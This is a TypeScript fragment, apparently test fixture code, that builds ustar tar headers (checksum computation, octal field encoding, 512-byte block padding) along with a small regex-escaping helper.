  header.fill(0x20, 148, 156);
  header[156] = 0x30;
  writeAscii(header, "ustar\0", 257, 6);
  writeAscii(header, "00", 263, 2);

  let checksum = 0;
  for (const byte of header) checksum += byte;
  writeAscii(header, octal(checksum, 6), 148, 8);
  header[154] = 0;
  header[155] = 0x20;
  return header;
}

function writeAscii(buffer: Buffer, text: string, offset: number, length: number): void {
  const bytes = Buffer.from(text, "ascii");
  if (bytes.byteLength > length) throw new Error(`fixture field is too long: ${text}`);
  bytes.copy(buffer, offset);
}

function octal(value: number, digits: number): string {
  return value.toString(8).padStart(digits, "0");
}

function paddedSize(size: number): number {
  return Math.ceil(size / 512) * 512;
}

function zeroBlock(): Buffer {
  return Buffer.alloc(512);
}

function escapeRegExp(value: string): string {
  return value.replace(/[\\^$.*+?()[\]{}|]/g, "\\$&");
}
